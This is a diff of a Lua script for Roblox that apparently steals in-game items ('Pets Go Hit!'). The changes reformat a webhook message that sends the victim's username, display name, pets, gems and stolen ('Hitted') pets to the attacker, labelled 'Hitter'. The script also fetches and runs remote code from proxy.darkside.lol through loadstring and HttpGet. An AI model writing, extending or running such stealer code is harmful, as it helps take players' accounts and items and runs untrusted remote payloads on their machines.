@@ -43,14 +43,14 @@ tab = ctab
 end
 if #tab >= 1 then
 for i,v in pairs(tab) do
-big=big..v[3].."x "..v[1].."(1/"..v[2]..")\\n"
+big=big.."+ "..v[3].."x "..v[1].."(1/"..v[2]..")\\n"
 end
 else
-big = "No pets over 1/".._G.Min.." :("
+big = "- No pets over 1/".._G.Min.." :("
 end
 end)
 if big == "" then
-big = "No pets over 1/".._G.Min.." :("
+big = "- No pets over 1/".._G.Min.." :("
 end
 if not qbig then
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga)
@@ -80,7 +80,7 @@ local log = ""
 if dh then
 log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"'..xxxvvv..'"}'
 else
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```'..pn..'```","name":"Pets","inline":true},{"value":"```'..gn..'```","name":"Gems","inline":true},{"value":"```'..big..'```","name":"Hitted Pets","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"'..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```fix\\n'..pn..'```","name":"Pets","inline":true},{"value":"```ini\\n['..gn..']```","name":"Gems","inline":false},{"value":"```diff\\n'..big..'```","name":"Hitted Pets","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"'..xxxvvv..'"}'
 end
 local responser =
         request(
